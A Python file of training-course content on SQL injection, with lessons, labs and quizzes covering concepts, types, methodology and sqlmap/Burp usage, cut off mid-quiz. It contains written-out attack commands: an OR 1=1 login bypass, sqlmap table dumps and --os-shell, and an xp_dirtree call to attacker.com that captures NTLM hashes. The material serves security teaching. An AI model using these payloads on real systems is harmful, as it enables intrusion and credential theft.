import os
import json

topics = {
    'sqli-concepts': {
        'eyebrow': 'Module 15 · Topic 1',
        'title': 'SQL Injection Concepts',
        'module': 'Phase 15: Database Security Specialist',
        'sub': 'Understanding the mechanics of SQL Injection vulnerabilities.',
        'objectives': [
            'Understand what SQL Injection is and how it occurs.',
            'Identify common input vectors for SQLi.',
            'Explain the impact of a successful SQL injection attack.'
        ],
        'learn': {
            'simple': 'SQL Injection (SQLi) is a code injection technique used to attack data-driven applications. In this attack, malicious SQL statements are inserted into entry fields for execution. This vulnerability occurs when user input is improperly sanitized or incorrectly filtered before being embedded in a database query.',
            'analogy': 'Imagine a security guard who blindly trusts anyone holding a specific type of clipboard. If an intruder creates a fake clipboard with instructions to open all doors, the guard obeys without verifying the instructions. SQLi works the same way by tricking the database into executing malicious commands.',
            'architecture': 'At an architectural level, SQLi targets the database tier of an application. When an application constructs a SQL query by concatenating strings that include unsanitized user input, an attacker can manipulate the structure of the query. This manipulation can allow them to bypass authentication, access, modify, or delete data, and in some cases, execute administrative operations on the database server.\n\nModern applications often use Object-Relational Mapping (ORM) or parameterized queries to mitigate this risk, but legacy systems or complex dynamic queries still frequently fall victim to this class of attack.',
            'why': 'SQL Injection remains one of the most critical and widespread web application vulnerabilities. For enterprise environments, a successful SQLi attack can lead to catastrophic data breaches, regulatory fines, and severe reputational damage.'
        },
        'enterprise': {
            'gfs': 'At Global Financial Services, an unauthenticated SQLi in the customer support portal could expose sensitive client transaction histories to unauthorized parties.',
            'windows': 'In a Windows environment using MSSQL, SQLi can be leveraged using xp_cmdshell to gain underlying operating system command execution, escalating the attack from the database to the domain network.',
            'linux': 'In Linux environments running MySQL or PostgreSQL, SQLi can allow attackers to read local files via LOAD_FILE() or achieve remote code execution if the database user has sufficient privileges.'
        },
        'workflow': [
            'Step 1: Identify data entry points in the web application (e.g., login forms, search bars).',
            'Step 2: Inject single quotes (\') or other special characters to test for errors.',
            'Step 3: Analyze the application\'s response (error messages or behavioral changes).',
            'Step 4: Craft a payload to manipulate the query logic (e.g., OR 1=1).',
            'Step 5: Extract data or bypass authentication based on the manipulated query.',
            'Step 6: Document the vulnerability and recommend parameterized queries.'
        ],
        'diagram': {
            'caption': 'Click to interact with the SQL Injection flow diagram',
            'svg': '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#f9f9f9"/><text x="300" y="200" font-family="sans-serif" font-size="20" text-anchor="middle" fill="#333">SQL Injection Concept Diagram</text></svg>'
        },
        'commands': {
            'lin': [
                { 'cmd': 'sqlmap -u "http://target/page?id=1" --dbs', 'purpose': 'Automated SQLi and enumerate databases', 'out': 'List of databases', 'note': 'Use cautiously as it generates significant traffic', 'mistake': 'Scanning without explicit permission' }
            ],
            'win': [
                { 'cmd': 'Invoke-Sqlcmd -ServerInstance "DBServer" -Query "SELECT * FROM Users"', 'purpose': 'Run queries on MSSQL', 'out': 'Query results', 'note': 'Useful for DB administration and testing access', 'mistake': 'Running as SA account unnecessarily' }
            ]
        },
        'lab': {
            'type': 'guided',
            'difficulty': 'Intermediate',
            'duration': '45',
            'platform': 'Kali Linux',
            'environment': 'Local Lab',
            'tools': ['SQLmap', 'Burp Suite'],
            'dependencies': [],
            'safety': ['Perform this lab only in an isolated environment.'],
            'scenario': 'You are assessing the GFS internal portal for database vulnerabilities.',
            'objectives': ['Identify a SQLi vulnerability', 'Extract the database version'],
            'steps': ['Step 1: Navigate to the target login page.', 'Step 2: Enter admin\' OR 1=1-- into the username field.'],
            'evidence': ['Screenshot of bypassed login screen.'],
            'validation': ['You should see: Welcome, Admin'],
            'troubleshooting': ['If login fails, ensure the comment syntax matches the backend database (e.g., -- or #).'],
            'mitre': [{ 'id': 'T1190', 'name': 'Exploit Public-Facing Application', 'tactic': 'Initial Access' }],
            'cleanup': ['Log out of the application and stop the lab environment.']
        },
        'quiz': [
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is the primary cause of SQL Injection vulnerabilities?',
                'opts': ['Lack of network encryption', 'Improperly sanitized user input', 'Weak database passwords', 'Outdated web servers'],
                'correct': 1,
                'fb': 'SQL Injection occurs when user input is concatenated directly into SQL queries without proper sanitization or parameterization.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which character is commonly used to test for SQLi?',
                'opts': ['&', '!', '\'', '$'],
                'correct': 2,
                'fb': 'The single quote (\') is used to break out of string literals in SQL queries.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is a common mitigation for SQL Injection?',
                'opts': ['Antivirus software', 'Parameterized queries', 'Changing default ports', 'Using HTTPs'],
                'correct': 1,
                'fb': 'Parameterized queries (prepared statements) separate code from data, preventing SQLi.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which tool is widely used for automated SQL injection?',
                'opts': ['Nmap', 'Wireshark', 'SQLmap', 'Metasploit'],
                'correct': 2,
                'fb': 'SQLmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Beginner',
                'q': 'SQL Injection only affects Microsoft SQL Server databases.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'SQL Injection can affect any relational database, including MySQL, PostgreSQL, Oracle, and MSSQL.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'In a tautology SQLi attack, what is a typical payload?',
                'opts': ['DROP TABLE users;', 'OR 1=1', 'UNION SELECT', 'WAITFOR DELAY'],
                'correct': 1,
                'fb': 'OR 1=1 is a tautology (always true) used to bypass authentication or extract all records.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is Object-Relational Mapping (ORM) in the context of SQLi?',
                'opts': ['A vulnerability scanner', 'A database firewall', 'A technique that often inherently protects against SQLi', 'A type of SQL injection payload'],
                'correct': 2,
                'fb': 'ORMs typically use parameterized queries by default, which helps mitigate SQLi risks.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Intermediate',
                'q': 'Blind SQL injection does not return data directly in the application\'s response.',
                'opts': ['True', 'False'],
                'correct': 0,
                'fb': 'In Blind SQLi, the attacker must infer the result by observing behavioral changes like response times or different error pages.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'Which SQL command is often abused in UNION-based SQLi to map the number of columns?',
                'opts': ['INSERT', 'ORDER BY', 'UPDATE', 'DELETE'],
                'correct': 1,
                'fb': 'ORDER BY is used to determine the number of columns in the original query by incrementing the column index until an error occurs.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'What is the purpose of the xp_cmdshell stored procedure in MSSQL?',
                'opts': ['To hash passwords', 'To execute OS commands', 'To backup databases', 'To monitor performance'],
                'correct': 1,
                'fb': 'xp_cmdshell allows execution of Windows command prompt commands directly from SQL queries, highly desired by attackers.'
            }
        ],
        'flashcards': [
            { 'f': 'SQL Injection', 'b': 'An attack where malicious SQL statements are inserted into entry fields for execution.' },
            { 'f': 'Tautology', 'b': 'A statement that is always true, often used in SQLi payloads like OR 1=1.' }
        ],
        'summary': [
            'SQL Injection exploits improper handling of user input.',
            'It allows attackers to manipulate backend queries.',
            'Impacts range from data leakage to full system compromise.',
            'Parameterized queries are the best defense.',
            'Automated tools like SQLmap simplify exploitation.'
        ],
        'outcomes': [
            'Explain the basic concepts of SQL Injection.',
            'Identify vulnerable application behaviors.',
            'Understand the impact on enterprise systems.'
        ],
        'meta': {
            'contentVersion': '1.0.0',
            'estimatedTime': 45,
            'difficulty': 'Intermediate',
            'prerequisites': ['Basic SQL knowledge'],
            'lastReviewed': '2026-07-18'
        }
    },
    'sqli-types': {
        'eyebrow': 'Module 15 · Topic 2',
        'title': 'Types of SQL Injection',
        'module': 'Phase 15: Database Security Specialist',
        'sub': 'Exploring In-Band, Inferential (Blind), and Out-of-Band SQL Injection techniques.',
        'objectives': [
            'Differentiate between In-Band, Inferential, and Out-of-Band SQLi.',
            'Understand how UNION-based and Error-based SQLi work.',
            'Explain the mechanics of Time-based and Boolean-based Blind SQLi.'
        ],
        'learn': {
            'simple': 'SQL Injection can be categorized based on how the application responds to the malicious payload. The main types are In-Band (Error-based and UNION-based), Inferential or Blind (Boolean-based and Time-based), and Out-of-Band. Each type requires a different approach for exploitation and detection.',
            'analogy': 'Think of asking a magic 8-ball questions. In-Band is like the ball directly answering your question. Blind SQLi is like a magic 8-ball that only glows green (true) or red (false). Out-of-Band is like asking the ball a question, and instead of showing the answer, it sends you an email later.',
            'architecture': 'In-Band SQLi relies on the same communication channel to both launch the attack and gather results. This happens when the application returns database errors or directly outputs the results of a UNION query on the web page.\n\nInferential SQLi occurs when the application is vulnerable but does not return results or errors. The attacker asks true/false questions and observes changes in the application\'s response (Boolean-based) or response time (Time-based).\n\nOut-of-Band SQLi is used when the attacker cannot use the same channel to launch the attack and gather results. It relies on the database server\'s ability to make DNS or HTTP requests to an attacker-controlled server.',
            'why': 'Understanding the different types of SQLi is crucial for both attackers and defenders. While In-Band SQLi is easy to exploit and detect, Blind and Out-of-Band techniques are more stealthy and require sophisticated tools or methodologies to identify and patch.'
        },
        'enterprise': {
            'gfs': 'At Global Financial Services, an attacker might use Time-based Blind SQLi on the login portal to extract administrator credentials without triggering any visible errors in the application.',
            'windows': 'In an MSSQL environment, an attacker could leverage Out-of-Band SQLi using xp_dirtree to force the database to authenticate to a rogue SMB server, capturing NTLM hashes.',
            'linux': 'In a PostgreSQL environment, an attacker might use UNION-based SQLi to extract data from multiple tables and dump it directly into the application\'s response.'
        },
        'workflow': [
            'Step 1: Test input fields for Error-based SQLi using single quotes.',
            'Step 2: If errors are suppressed, attempt UNION-based SQLi by determining the column count using ORDER BY.',
            'Step 3: If no data is returned, attempt Boolean-based Blind SQLi using true/false conditions (e.g., AND 1=1 vs AND 1=2).',
            'Step 4: If the application response does not change, attempt Time-based Blind SQLi using delay commands (e.g., WAITFOR DELAY \'0:0:5\').',
            'Step 5: If all else fails, attempt Out-of-Band SQLi by forcing the database to resolve an external DNS name.',
            'Step 6: Document the successful technique and extracted data.'
        ],
        'diagram': {
            'caption': 'Click to interact with the SQL Injection Types diagram',
            'svg': '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#f9f9f9"/><text x="300" y="200" font-family="sans-serif" font-size="20" text-anchor="middle" fill="#333">SQLi Types Diagram</text></svg>'
        },
        'commands': {
            'lin': [
                { 'cmd': 'sqlmap -u "http://target/page?id=1" --technique=T', 'purpose': 'Test for Time-based Blind SQLi', 'out': 'Vulnerability confirmation', 'note': 'Time-based testing is slow', 'mistake': 'Setting high delays causing server timeouts' }
            ],
            'win': [
                { 'cmd': 'EXEC master..xp_dirtree \'\\\\attacker.com\\share\'', 'purpose': 'Out-of-Band SQLi (SMB Relay)', 'out': 'Captured NTLM Hash', 'note': 'Requires xp_dirtree enabled', 'mistake': 'Using invalid network paths' }
            ]
        },
        'lab': {
            'type': 'guided',
            'difficulty': 'Advanced',
            'duration': '60',
            'platform': 'Kali Linux',
            'environment': 'Local Lab',
            'tools': ['Burp Suite', 'SQLmap'],
            'dependencies': [],
            'safety': ['Perform this lab only in an isolated environment.'],
            'scenario': 'You are tasked with identifying Blind SQLi vulnerabilities in the GFS HR portal.',
            'objectives': ['Identify a Time-based Blind SQLi', 'Extract database user via Boolean-based SQLi'],
            'steps': ['Step 1: Intercept the login request in Burp Suite.', 'Step 2: Inject a WAITFOR DELAY payload and observe the response time.'],
            'evidence': ['Burp Suite history showing delayed responses.'],
            'validation': ['You should see: The response takes exactly 5 seconds longer than normal.'],
            'troubleshooting': ['If the response is not delayed, the database might not support WAITFOR DELAY (try pg_sleep for PostgreSQL).'],
            'mitre': [{ 'id': 'T1190', 'name': 'Exploit Public-Facing Application', 'tactic': 'Initial Access' }],
            'cleanup': ['Close Burp Suite and stop the target application.']
        },
        'quiz': [
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which type of SQL Injection relies on the database returning explicit error messages?',
                'opts': ['UNION-based', 'Error-based', 'Time-based', 'Out-of-Band'],
                'correct': 1,
                'fb': 'Error-based SQLi leverages detailed database error messages to infer information about the database structure.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'In UNION-based SQLi, what must match between the original query and the injected query?',
                'opts': ['Table names', 'Database version', 'Number and data types of columns', 'Execution time'],
                'correct': 2,
                'fb': 'For a UNION operator to work, both SELECT statements must return the same number of columns with compatible data types.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which technique is used when the application does not return data or errors, but its behavior changes based on true/false conditions?',
                'opts': ['Error-based SQLi', 'Boolean-based Blind SQLi', 'Time-based Blind SQLi', 'Out-of-Band SQLi'],
                'correct': 1,
                'fb': 'Boolean-based Blind SQLi relies on observing differences in the application\'s response (e.g., content length) based on true or false conditions injected into the query.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which SQL function is commonly used for Time-based Blind SQLi in MySQL?',
                'opts': ['WAITFOR DELAY', 'pg_sleep()', 'SLEEP()', 'DBMS_LOCK.SLEEP()'],
                'correct': 2,
                'fb': 'In MySQL, the SLEEP() function pauses execution for a specified number of seconds.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Advanced',
                'q': 'Out-of-Band SQL Injection often relies on features that allow the database to make external network requests, such as DNS lookups.',
                'opts': ['True', 'False'],
                'correct': 0,
                'fb': 'Out-of-Band SQLi uses alternate channels like DNS or HTTP requests initiated by the database server to exfiltrate data.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'When performing UNION-based SQLi, how do attackers typically determine the number of columns in the original query?',
                'opts': ['Using the SLEEP() function', 'Using the ORDER BY clause', 'Using the DROP TABLE command', 'Using Out-of-Band DNS requests'],
                'correct': 1,
                'fb': 'Attackers increment the column index in the ORDER BY clause (e.g., ORDER BY 1, ORDER BY 2) until an error is thrown, indicating the total number of columns.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is the primary difference between In-Band and Inferential SQLi?',
                'opts': ['In-Band requires network access; Inferential does not.', 'In-Band retrieves data via the same channel; Inferential infers data from application behavior.', 'Inferential is faster than In-Band.', 'In-Band only works on MSSQL; Inferential only works on MySQL.'],
                'correct': 1,
                'fb': 'In-Band SQLi extracts data directly in the application\'s response, while Inferential SQLi reconstructs data by asking true/false questions.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Intermediate',
                'q': 'Time-based Blind SQLi is generally faster to execute than Error-based SQLi.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'Time-based Blind SQLi is much slower because it requires the database to pause execution for every bit or byte of data extracted.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'Which payload would be most appropriate for testing Boolean-based Blind SQLi?',
                'opts': ['\' OR SLEEP(10)--', '\' UNION SELECT 1,2,3--', 'id=1\' AND 1=1--', 'id=1; xp_cmdshell(\'dir\')'],
                'correct': 2,
                'fb': 'id=1\' AND 1=1-- is a Boolean-based payload. The attacker compares the response of AND 1=1 (true) with AND 1=2 (false).'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Why is Out-of-Band SQLi less common than In-Band SQLi?',
                'opts': ['It requires administrative privileges.', 'It is harder to automate.', 'It relies on the database having outbound network access.', 'It only works on older databases.'],
                'correct': 2,
                'fb': 'Many enterprise environments restrict outbound network traffic from database servers, preventing Out-of-Band techniques from succeeding.'
            }
        ],
        'flashcards': [
            { 'f': 'Inferential SQLi', 'b': 'A type of SQLi where the attacker infers data by observing application behavior, not direct data output.' },
            { 'f': 'Out-of-Band SQLi', 'b': 'A type of SQLi that uses a different communication channel (like DNS or HTTP) to extract data.' }
        ],
        'summary': [
            'In-Band SQLi is the most straightforward, using errors or UNIONs.',
            'Blind SQLi (Boolean and Time) infers data character by character.',
            'Out-of-Band SQLi is useful when direct responses are filtered.',
            'Each type requires specific payloads and identification techniques.',
            'Mitigation strategies are generally the same across all types.'
        ],
        'outcomes': [
            'Identify the three main categories of SQL Injection.',
            'Construct basic payloads for UNION and Time-based SQLi.',
            'Understand the requirements for Out-of-Band exploitation.'
        ],
        'meta': {
            'contentVersion': '1.0.0',
            'estimatedTime': 60,
            'difficulty': 'Advanced',
            'prerequisites': ['SQLi Concepts'],
            'lastReviewed': '2026-07-18'
        }
    },
    'sqli-methodology': {
        'eyebrow': 'Module 15 · Topic 3',
        'title': 'SQL Injection Methodology',
        'module': 'Phase 15: Database Security Specialist',
        'sub': 'A structured approach to discovering, exploiting, and mitigating SQL Injection.',
        'objectives': [
            'Learn the systematic methodology for testing SQLi.',
            'Understand the steps for information gathering and vulnerability detection.',
            'Explore data extraction and post-exploitation techniques.'
        ],
        'learn': {
            'simple': 'The SQL Injection methodology provides a structured framework for penetration testers to systematically identify, confirm, and exploit SQLi vulnerabilities. It begins with mapping the application to find all data entry points, followed by testing those points with specific payloads, and finally extracting data or escalating privileges.',
            'analogy': 'Consider a safe cracker. They first examine the safe (Information Gathering), then they test the lock mechanism (Vulnerability Detection), figure out the combination (Exploitation), and finally empty the safe (Data Extraction). The SQLi methodology follows a similar pattern.',
            'architecture': 'The methodology is fundamentally divided into phases: Information Gathering, Vulnerability Detection, Database Fingerprinting, Exploitation/Data Extraction, and Post-Exploitation.\n\nInformation Gathering involves identifying all input vectors like GET/POST parameters, HTTP headers (User-Agent, Referer), and cookies. Vulnerability Detection involves injecting characters like \', ", or logical operators to provoke errors or behavioral changes. Database Fingerprinting determines the backend DBMS (MySQL, MSSQL, Oracle) by analyzing error messages or specific function responses. Exploitation leverages this knowledge to craft specific payloads, and Post-Exploitation involves actions like reading local files or executing OS commands.',
            'why': 'A structured methodology ensures thorough testing and minimizes the risk of missing vulnerabilities or causing accidental damage to the target system during an assessment.'
        },
        'enterprise': {
            'gfs': 'At Global Financial Services, a penetration tester follows this methodology to systematically test the complex loan application workflow, ensuring all input fields and hidden parameters are evaluated.',
            'windows': 'During the fingerprinting phase in a Windows environment, identifying MSSQL allows the tester to immediately focus on Windows-specific features like xp_cmdshell for post-exploitation.',
            'linux': 'In a Linux environment, identifying MySQL leads the tester to focus on privileges like FILE to attempt reading /etc/passwd or writing a web shell.'
        },
        'workflow': [
            'Step 1: Map the application and identify all data entry points (Information Gathering).',
            'Step 2: Inject test payloads to identify anomalies or errors (Vulnerability Detection).',
            'Step 3: Analyze the errors or behavior to identify the DBMS version (Fingerprinting).',
            'Step 4: Craft specific payloads to bypass authentication or extract data (Exploitation).',
            'Step 5: Attempt to escalate privileges or execute OS commands (Post-Exploitation).',
            'Step 6: Document findings and provide remediation recommendations (Reporting).'
        ],
        'diagram': {
            'caption': 'Click to interact with the SQLi Methodology workflow',
            'svg': '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#f9f9f9"/><text x="300" y="200" font-family="sans-serif" font-size="20" text-anchor="middle" fill="#333">SQLi Methodology Diagram</text></svg>'
        },
        'commands': {
            'lin': [
                { 'cmd': 'sqlmap -u "http://target/" --crawl=2 --batch', 'purpose': 'Automated mapping and vulnerability detection', 'out': 'List of vulnerable parameters', 'note': 'Automated crawling can miss complex workflows', 'mistake': 'Running against production without tuning requests' }
            ],
            'win': [
                { 'cmd': 'sqsh -S Server -U user -P pass', 'purpose': 'Connect to MSSQL database for post-exploitation', 'out': 'Interactive SQL shell', 'note': 'Used after credentials are extracted', 'mistake': 'Failing to use encryption for connections' }
            ]
        },
        'lab': {
            'type': 'guided',
            'difficulty': 'Intermediate',
            'duration': '45',
            'platform': 'Kali Linux',
            'environment': 'Local Lab',
            'tools': ['Burp Suite', 'Browser Developer Tools'],
            'dependencies': [],
            'safety': ['Perform this lab only in an isolated environment.'],
            'scenario': 'Perform a manual SQLi assessment against the GFS legacy CRM system.',
            'objectives': ['Map application inputs', 'Fingerprint the backend database manually'],
            'steps': ['Step 1: Spider the application using Burp Suite.', 'Step 2: Inject database-specific functions like @@version or version().'],
            'evidence': ['Extracted database version string.'],
            'validation': ['You should see: Microsoft SQL Server 2019'],
            'troubleshooting': ['If generic errors appear, try Inferential techniques to deduce the database type.'],
            'mitre': [{ 'id': 'T1190', 'name': 'Exploit Public-Facing Application', 'tactic': 'Initial Access' }],
            'cleanup': ['Clear browser history and Burp Suite state.']
        },
        'quiz': [
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is the first step in the SQL Injection methodology?',
                'opts': ['Exploitation', 'Database Fingerprinting', 'Information Gathering', 'Post-Exploitation'],
                'correct': 2,
                'fb': 'Information Gathering is crucial to identify all potential injection vectors before attempting exploitation.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'During Vulnerability Detection, which HTTP header is often overlooked as an injection vector?',
                'opts': ['Content-Length', 'Accept-Encoding', 'User-Agent', 'Connection'],
                'correct': 2,
                'fb': 'User-Agent strings are often logged into databases without sanitization, making them prime targets for SQLi.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is the purpose of Database Fingerprinting?',
                'opts': ['To guess passwords', 'To identify the backend DBMS and version', 'To extract all tables', 'To map the network'],
                'correct': 1,
                'fb': 'Knowing the exact DBMS (e.g., MySQL, Oracle) allows the attacker to craft highly specific and effective payloads.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'If injecting @@version returns an error, but version() succeeds, which DBMS is likely in use?',
                'opts': ['MSSQL', 'Oracle', 'MySQL', 'DB2'],
                'correct': 2,
                'fb': 'version() is typically used in MySQL and PostgreSQL, whereas @@version is standard for MSSQL.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Beginner',
                'q': 'Cookies cannot be used as a vector for SQL Injection.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'Cookies are sent in HTTP requests and are often processed by the server, making them viable SQLi vectors.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'In the Post-Exploitation phase of MSSQL, which feature is highly sought after for OS command execution?',
                'opts': ['OPENROWSET', 'xp_cmdshell', 'sp_makewebtask', 'LOAD_FILE'],
                'correct': 1,
                'fb': 'xp_cmdshell is a powerful stored procedure in MSSQL that executes commands in the Windows command shell.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which payload helps verify a Time-based vulnerability in PostgreSQL?',
                'opts': ['WAITFOR DELAY \'0:0:5\'', 'SLEEP(5)', 'pg_sleep(5)', 'DBMS_LOCK.SLEEP(5)'],
                'correct': 2,
                'fb': 'pg_sleep() is the function used in PostgreSQL to delay query execution.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Intermediate',
                'q': 'Data extraction is the final goal of all SQL Injection attacks.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'While common, attackers may also aim for authentication bypass, data modification, or system compromise (RCE).'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'When mapping an application, why are hidden form fields important?',
                'opts': ['They contain passwords.', 'Developers often assume they cannot be modified by users.', 'They are encrypted.', 'They speed up the application.'],
                'correct': 1,
                'fb': 'Developers sometimes fail to validate hidden fields, assuming they are tamper-proof, making them excellent injection vectors.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is the recommended remediation for SQL Injection discovered during a penetration test?',
                'opts': ['Web Application Firewalls (WAF)', 'Input filtering (blocklists)', 'Parameterized queries (Prepared Statements)', 'Using HTTPS'],
                'correct': 2,
                'fb': 'Parameterized queries are the most effective defense, treating input as data rather than executable code.'
            }
        ],
        'flashcards': [
            { 'f': 'Database Fingerprinting', 'b': 'The process of determining the type and version of the backend database management system.' },
            { 'f': 'Post-Exploitation (SQLi)', 'b': 'Actions taken after successful injection, such as reading files, escalating privileges, or gaining a command shell.' }
        ],
        'summary': [
            'A structured methodology ensures comprehensive testing.',
            'Information gathering identifies all potential injection vectors.',
            'Fingerprinting allows for tailored payload creation.',
            'Exploitation leads to data extraction or authentication bypass.',
            'Post-exploitation focuses on maximizing the impact of the vulnerability.'
        ],
        'outcomes': [
            'Execute a systematic SQL Injection assessment.',
            'Fingerprint common database management systems.',
            'Identify unconventional injection vectors like HTTP headers.'
        ],
        'meta': {
            'contentVersion': '1.0.0',
            'estimatedTime': 45,
            'difficulty': 'Intermediate',
            'prerequisites': ['SQLi Concepts', 'SQLi Types'],
            'lastReviewed': '2026-07-18'
        }
    },
    'sqli-tools': {
        'eyebrow': 'Module 15 · Topic 4',
        'title': 'SQL Injection Tools',
        'module': 'Phase 15: Database Security Specialist',
        'sub': 'Automating discovery and exploitation with industry-standard tools.',
        'objectives': [
            'Familiarize with automated SQL injection tools like SQLmap.',
            'Understand how to intercept and manipulate traffic using Burp Suite.',
            'Learn the balance between automated tools and manual verification.'
        ],
        'learn': {
            'simple': 'While manual SQL injection is crucial for understanding the vulnerability, automated tools are essential for efficiency in professional environments. Tools like SQLmap automate the process of detecting and exploiting SQLi flaws, while proxies like Burp Suite allow testers to manually craft and observe requests and responses.',
            'analogy': 'Manual SQLi is like picking a lock with hand tools; it takes skill and time. Using SQLmap is like using a master key or a specialized lockpicking gun; it\'s faster and often more effective for standard locks, but you still need the manual skills when the automated tool fails.',
            'architecture': 'SQLmap works by sending hundreds or thousands of tailored payloads to a target parameter, analyzing the HTTP responses for errors, time delays, or Boolean changes. It has an extensive database of payloads for all major DBMS types and can automatically fingerprint the database, extract data, and even spawn command shells.\n\nBurp Suite acts as an interception proxy, sitting between the browser and the application. It allows testers to capture requests, modify parameters (including headers and cookies) on the fly, and send them to the server, making it indispensable for manual Vulnerability Detection and verification of automated findings.',
            'why': 'In a large enterprise assessment, testing every parameter manually is impossible. Automated tools provide coverage and speed, while manual tools like Burp Suite provide precision and handle complex authentication workflows that automated tools struggle with.'
        },
        'enterprise': {
            'gfs': 'At Global Financial Services, penetration testers use Burp Suite to navigate complex SSO login flows, save the authenticated state, and then pass that state to SQLmap for automated testing of internal applications.',
            'windows': 'Testers use SQLmap\'s --os-shell feature against vulnerable MSSQL instances to attempt direct command execution on the underlying Windows server.',
            'linux': 'In Linux environments, testers might use SQLmap\'s --file-read capability to quickly extract configuration files from vulnerable MySQL servers.'
        },
        'workflow': [
            'Step 1: Configure the browser to proxy traffic through Burp Suite.',
            'Step 2: Navigate the application to populate Burp\'s site map.',
            'Step 3: Identify a potentially vulnerable request and save it to a text file.',
            'Step 4: Run SQLmap using the saved request file (sqlmap -r request.txt).',
            'Step 5: Review SQLmap\'s output to confirm the vulnerability and database type.',
            'Step 6: Use SQLmap to extract specific data tables or attempt OS access.'
        ],
        'diagram': {
            'caption': 'Click to interact with the SQLi Tooling Architecture',
            'svg': '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#f9f9f9"/><text x="300" y="200" font-family="sans-serif" font-size="20" text-anchor="middle" fill="#333">SQLi Tools Diagram</text></svg>'
        },
        'commands': {
            'lin': [
                { 'cmd': 'sqlmap -r request.txt --dbs', 'purpose': 'Run SQLmap using a saved Burp request', 'out': 'List of databases', 'note': 'Best method for authenticated testing', 'mistake': 'Running without --batch in scripts' },
                { 'cmd': 'sqlmap -u "http://target/page?id=1" --dump -T users', 'purpose': 'Dump specific table contents', 'out': 'Contents of the users table', 'note': 'Can take a long time on large tables', 'mistake': 'Dumping entire databases unnecessarily' }
            ],
            'win': [
                { 'cmd': 'sqlmap.py -u "http://target/page?id=1" --os-shell', 'purpose': 'Attempt to gain an interactive OS shell', 'out': 'Command prompt access', 'note': 'Requires high privileges on the DB', 'mistake': 'Leaving the uploaded web shell on the server' }
            ]
        },
        'lab': {
            'type': 'guided',
            'difficulty': 'Intermediate',
            'duration': '60',
            'platform': 'Kali Linux',
            'environment': 'Local Lab',
            'tools': ['SQLmap', 'Burp Suite'],
            'dependencies': [],
            'safety': ['Perform this lab only in an isolated environment.'],
            'scenario': 'Automate the exploitation of the previously discovered SQLi vulnerability on the GFS staging server.',
            'objectives': ['Capture a request with Burp', 'Exploit the request with SQLmap', 'Dump the users table'],
            'steps': ['Step 1: Save the vulnerable POST request from Burp to req.txt.', 'Step 2: Run sqlmap -r req.txt --dbs', 'Step 3: Run sqlmap -r req.txt -D gfs_db -T users --dump'],
            'evidence': ['Output of the dumped users table.'],
            'validation': ['You should see: Passwords or password hashes for application users.'],
            'troubleshooting': ['If SQLmap fails to detect the vulnerability, adjust the --level and --risk parameters.'],
            'mitre': [{ 'id': 'T1190', 'name': 'Exploit Public-Facing Application', 'tactic': 'Initial Access' }],
            'cleanup': ['Remove any files created by SQLmap testing.']
        },
        'quiz': [
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which tool is primarily known as an interception proxy for web application testing?',
                'opts': ['Nmap', 'SQLmap', 'Burp Suite', 'Metasploit'],
                'correct': 2,
                'fb': 'Burp Suite intercepts HTTP/S traffic between the browser and the application, allowing for manual manipulation.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is the primary function of SQLmap?',
                'opts': ['Network mapping', 'Automated SQL injection and database takeover', 'Password cracking', 'Web application firewall'],
                'correct': 1,
                'fb': 'SQLmap automates the process of detecting and exploiting SQL injection flaws.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'In SQLmap, what does the parameter \'-r\' do?',
                'opts': ['Sets the request rate', 'Loads an HTTP request from a text file', 'Specifies the risk level', 'Removes temporary files'],
                'correct': 1,
